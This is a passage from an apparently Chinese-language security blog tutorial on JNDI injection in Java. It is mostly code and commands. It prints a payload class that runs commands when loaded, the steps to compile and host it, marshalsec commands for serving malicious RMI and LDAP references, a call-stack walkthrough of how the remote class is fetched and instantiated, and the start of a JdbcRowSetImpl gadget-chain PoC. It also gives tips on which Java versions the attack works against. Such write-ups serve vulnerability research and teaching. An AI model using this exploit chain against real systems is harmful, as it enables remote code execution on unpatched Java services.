class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.Reader;</span><br><span class="line"><span class="keyword">import</span> javax.print.attribute.standard.PrinterMessageFromOperator;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExecTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException,InterruptedException</span>&#123;</span><br><span class="line">        String cmd=<span class="string">"whoami"</span>;</span><br><span class="line">        <span class="keyword">final</span> Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">        printMessage(process.getInputStream());;</span><br><span class="line">        printMessage(process.getErrorStream());</span><br><span class="line">        <span class="keyword">int</span> value=process.waitFor();</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printMessage</span><span class="params">(<span class="keyword">final</span> InputStream input)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="keyword">new</span> Thread (<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">                Reader reader =<span class="keyword">new</span> InputStreamReader(input);</span><br><span class="line">                BufferedReader bf = <span class="keyword">new</span> BufferedReader(reader);</span><br><span class="line">                String line = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span> ((line=bf.readLine())!=<span class="keyword">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        System.out.println(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException  e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译成class文件：<code>javac ExecTest.java</code><br>部署在web服务上：<code>py -3 -m http.server 8081</code></p><p>运行SERVER<br>运行CLIENT</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g8978mkmhyj31ir1btgt8.jpg" alt="POC成功.png"></p><blockquote><p>把ExecTest.java及其编译的文件放到其他目录下，不然会在当前目录中直接找到这个类。不起web服务也会命令执行成功。<br>ExecTest.java文件不能申明包名，即package xxx。声明后编译的class文件函数名称会加上包名从而不匹配。<br>java版本小于1.8u191。之后版本存在trustCodebaseURL的限制，只信任已有的codebase地址，不再能够从指定codebase中下载字节码。</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g8979dgfh9j31ys0bt0uc.jpg" alt="1.8u211_失败.png"></p><h3 id="分析调用流程"><a href="#分析调用流程" class="headerlink" title="分析调用流程"></a>分析调用流程</h3><p>整体调用栈如下：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g8979n598cj30vr08nq3k.jpg" alt="调用栈.png"></p><p><code>InitialContext.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="comment">//getURLOrDefaultInitCtx函数会分析name的协议头返回对应协议的环境对象，此处返回Context对象的子类rmiURLContext对象</span></span><br><span class="line">    <span class="comment">//然后在对应协议中去lookup搜索，我们进入lookup函数</span></span><br><span class="line">    <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>GenericURLContext.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var1="rmi://127.0.0.1:1099/aa"</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="comment">//此处this为rmiURLContext类调用对应类的getRootURLContext类为解析RMI地址</span></span><br><span class="line">    <span class="comment">//不同协议调用这个函数，根据之前getURLOrDefaultInitCtx(name)返回对象的类型不同，执行不同的getRootURLContext</span></span><br><span class="line">    <span class="comment">//进入不同的协议路线</span></span><br><span class="line">    ResolveResult var2 = <span class="keyword">this</span>.getRootURLContext(var1, <span class="keyword">this</span>.myEnv);<span class="comment">//获取RMI注册中心相关数据</span></span><br><span class="line">    Context var3 = (Context)var2.getResolvedObj();<span class="comment">//获取注册中心对象</span></span><br><span class="line"></span><br><span class="line">    Object var4;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var4 = var3.lookup(var2.getRemainingName());<span class="comment">//去注册中心调用lookup查找，我们进入此处，传入name-aa</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        var3.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g897a0gnsnj31h608idh5.jpg" alt="分支getRootURLContext.png"></p><p><code>RegistryContext.java</code>：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入var1=aa</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RegistryContext(<span class="keyword">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">//判断来到这里</span></span><br><span class="line">        Remote var2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = <span class="keyword">this</span>.registry.lookup(var1.get(<span class="number">0</span>));<span class="comment">//RMI客户端与注册中心通讯，返回RMI服务IP，地址等信息</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));<span class="comment">//我们进入此处</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g897a8b25uj31pw125n2b.jpg" alt="客户端与注册中心通讯-返回RMI服务接口.png"></p><p><code>RegistryContext.java</code>：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//注意到上面的服务端代码，我们在RMI服务端绑定的是一个Reference对象，世界线在这里变动</span></span><br><span class="line">            <span class="comment">//如果是Reference对象会，进入var.getReference()，与RMI服务器进行一次连接，获取到远程class文件地址。</span></span><br><span class="line">            <span class="comment">//如果是普通RMI对象服务，这里不会进行连接，只有在正式远程函数调用的时候才会连接RMI服务。</span></span><br><span class="line">            Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">            <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">            <span class="comment">//获取reference对象进入此处</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            NamingException var4 = <span class="keyword">new</span> NamingException();</span><br><span class="line">            var4.setRootCause(var7);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g897afb8g2j32830w8jyx.jpg" alt="世界线变动-非reference.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g897akpycbj31p51200x9.jpg" alt="世界线变动-reference.png"></p><p><code>NamingManager.java</code> 截取部分有用的代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入Reference对象到refinfo</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">    getObjectInstance(Object refInfo, Name name, Context nameCtx,</span><br><span class="line">                        Hashtable&lt;?,?&gt; environment)</span><br><span class="line">    <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">// Use builder if installed</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// Use reference if possible</span></span><br><span class="line">    Reference ref = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;<span class="comment">//满足</span></span><br><span class="line">        ref = (Reference) refInfo;<span class="comment">//复制</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;<span class="comment">//不进入</span></span><br><span class="line">        ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object answer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="keyword">null</span>) &#123;<span class="comment">//进入此处</span></span><br><span class="line">        String f = ref.getFactoryClassName();<span class="comment">//函数名 ExecTest</span></span><br><span class="line">        <span class="keyword">if</span> (f != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//任意命令执行点1（构造函数、静态代码），进入此处</span></span><br><span class="line">            factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">            <span class="keyword">if</span> (factory != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//任意命令执行点2（覆写getObjectInstance），</span></span><br><span class="line">                <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                    environment);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// if reference has no factory, check for addresses</span></span><br><span class="line">            <span class="comment">// containing URLs</span></span><br><span class="line"></span><br><span class="line">            answer = processURLAddrs(ref, name, nameCtx, environment);</span><br><span class="line">            <span class="keyword">if</span> (answer != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> answer;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p><code>NamingManager.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ObjectFactory <span class="title">getObjectFactoryFromReference</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    Reference ref, String factoryName)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IllegalAccessException,</span></span><br><span class="line"><span class="function">    InstantiationException,</span></span><br><span class="line"><span class="function">    MalformedURLException </span>&#123;</span><br><span class="line">    Class clas = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//尝试从本地获取该class</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">            clas = helper.loadClass(factoryName);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// ignore and continue</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果不在本地classpath，从cosebase中获取class</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">            (codebase = ref.getFactoryClassLocation()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//此处codebase是我们在恶意RMI服务端中定义的http://127.0.0.1:8081/</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//从我们放置恶意class文件的web服务器中获取class文件</span></span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//实例化我们的恶意class文件</span></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="keyword">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>实例化会默认调用构造方法、静态代码块。<br>上面的例子就是调用了构造方法完成任意代码执行。</p><p>但是可以注意到之前执行任意命令成功，但是报错退出了，我们修改我们的恶意class文件，换一个命令执行点<code>factory.getObjectInstance</code>复写该函数执行命令。</p><ol><li>报错是因为我们的类在实例化后不能转化为ObjectFactory<code>(ObjectFactory) clas.newInstance()</code>。只需要我们的类继承该类即可。</li><li>根据ObjectFactory.java的getObjectInstance接口复写函数<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span></span><br><span class="line"><span class="function"><span class="params">                                Hashtable&lt;?,?&gt; environment)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> Exception</span>;</span><br></pre></td></tr></table></figure></li></ol><p>最终第二版ExecTest如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecTest</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> </span>&#123;</span><br><span class="line">        exec(<span class="string">"xterm"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        exec(<span class="string">"123"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g897awcgtkj31iy0x5wmt.jpg" alt="计算机成功.png"></p><blockquote><p>此外，1.8编译的ExecTest.java在1.7受害者环境中是不能运行的。反而1.7编译的ExecTest.java在1.8受害者环境中可以运行。<br>看来。。使用低版本的还好一点</p></blockquote><h2 id="使用工具起rmi-ldap服务"><a href="#使用工具起rmi-ldap服务" class="headerlink" title="使用工具起rmi ldap服务"></a>使用工具起rmi ldap服务</h2><p>以上我们就成功复现了JNDI注入，但是在常规使用中我们自己起rmi服务器太麻烦了。<br>我们使用<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec反序列化工具</a>起rmi、ldap服务</p><p>装有java8，使用<code>mvn clean package -DskipTests</code>编译</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rmi服务器，rmi服务起在8088 恶意class在http://ip:8080/文件夹/#ExportObject </span></span><br><span class="line"><span class="comment">#不加8088端口号 默认是1099</span></span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:8080/文件夹/<span class="comment">#ExportObject 8088</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rmi服务器，rmi服务起在8088 恶意class在http://ip:8080/文件夹/#ExportObject </span></span><br><span class="line"><span class="comment">#不加8088端口号 默认是1389</span></span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:8080/文件夹/<span class="comment">#ExportObject 8088</span></span><br></pre></td></tr></table></figure><p>同时恶意class文件的web服务还需要自己去起。</p><h2 id="com-sun-rowset-JdbcRowSetImpl-利用链"><a href="#com-sun-rowset-JdbcRowSetImpl-利用链" class="headerlink" title="com.sun.rowset.JdbcRowSetImpl 利用链"></a>com.sun.rowset.JdbcRowSetImpl 利用链</h2><p>在回到我们之前的攻击目标服务端（也就是rmi服务客户端）</p><p>目前我们利用jndi注入需要满足2个条件：<br>我们需要服务端存在以下代码，uri可控<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String uri = <span class="string">"rmi://127.0.0.1:1099/aa"</span>;</span><br><span class="line">Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">ctx.lookup(uri);</span><br></pre></td></tr></table></figure></p><p>并且存在漏洞版本的java环境（目前我们知道1.8u191是不可以的）</p><p>我们先来扩展第一个代码限制的问题，就有点像在commons-collection反序列化一文寻找readobject复写点一样。<br>总是有很多机缘巧合。</p><p><strong>com.sun.rowset.JdbcRowSetImpl</strong>类：是在fastjson反序列化漏洞中触发jndi注入的一环，此处也算是一个引子，之后将详细分析fastjson反序列化的原因。</p><p><code>JdbcRowSetImpl.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();<span class="comment">//进入此处</span></span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>JdbcRowSetImpl.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;<span class="comment">//我们需要一个我们可控的getDataSourceName</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//下面两句是完美的漏洞触发代码</span></span><br><span class="line">                InitialContext var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">                DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());<span class="comment">//可控的jndi注入点</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">""</span>) ? var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">"jdbcrowsetimpl.connect"</span>).toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span> ? DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>最后需要<strong>this.getDataSourceName()</strong>的赋值处：<br><code>JdbcRowSetImpl.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDataSourceName</span><span class="params">(String var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="comment">//var1可控</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.getDataSourceName().equals(var1)) &#123;</span><br><span class="line">            String var2 = <span class="keyword">this</span>.getDataSourceName();</span><br><span class="line">            <span class="keyword">super</span>.setDataSourceName(var1);</span><br><span class="line">            <span class="keyword">this</span>.conn = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">this</span>.ps = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">this</span>.rs = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">this</span>.propertyChangeSupport.firePropertyChange(<span class="string">"dataSourceName"</span>, var2, var1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.setDataSourceName(var1);<span class="comment">//赋值setDataSourceName</span></span><br><span class="line">        <span class="keyword">this</span>.propertyChangeSupport.firePropertyChange(<span class="string">"dataSourceName"</span>, (Object)<span class="keyword">null</span>, var1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>所以客户端的POC如下（即受害者执行以下代码就可以触发漏洞）<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi注入;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        JdbcRowSetImpl JdbcRowSetImpl_inc = <span 